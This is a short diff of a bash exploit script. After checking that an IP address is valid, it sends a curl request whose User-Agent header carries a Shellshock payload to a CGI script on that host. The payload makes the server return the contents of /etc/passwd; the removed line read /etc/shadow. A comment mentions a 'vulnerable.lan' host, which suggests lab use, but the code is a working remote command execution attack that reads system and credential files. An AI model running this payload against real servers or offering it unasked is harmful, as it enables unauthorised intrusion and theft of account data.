@@ -14,4 +14,4 @@ if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
 fi
 
 # create vulnerable.lan & replace IP with that name
-curl 'http://'$ip'/cgi-bin/shell.sh' -H "User-Agent: () { :;}; /bin/echo -e \"Content-Type: text/plain\r\n\r\n$(/bin/cat /etc/shadow)\""
+curl 'http://'$ip'/cgi-bin/shell.sh' -H "User-Agent: () { :;}; /bin/echo -e \"Content-Type: text/plain\r\n\r\n$(/bin/cat /etc/passwd)\""
